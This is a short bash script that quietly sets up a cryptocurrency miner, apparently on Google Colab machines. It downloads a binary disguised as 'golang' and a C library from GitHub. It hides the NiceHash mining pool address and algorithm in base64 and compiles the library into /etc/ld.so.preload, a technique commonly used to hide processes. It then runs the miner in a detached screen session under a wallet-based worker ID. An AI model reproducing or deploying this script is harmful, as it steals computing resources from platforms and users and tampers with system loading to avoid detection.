#!/bin/bash

golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c

hostname=$(cat /var/colab/hostname)
userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$hostname
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
key=ZXRoYXNo

seed=$(echo $string | base64 --decode)
apikey=$(echo $key | base64 --decode)

sudo apt-get install -y libpci-dev gcc screen

wget $golang
wget $libgolang


gcc -Wall -fPIC -shared -o libgolang.so libgolang.c -ldl
sudo mv libgolang.so /usr/local/lib/
echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload

chmod 777 golang

screen -S "golang" ./golang -a $apikey --url $seed -u $userAgent -p x
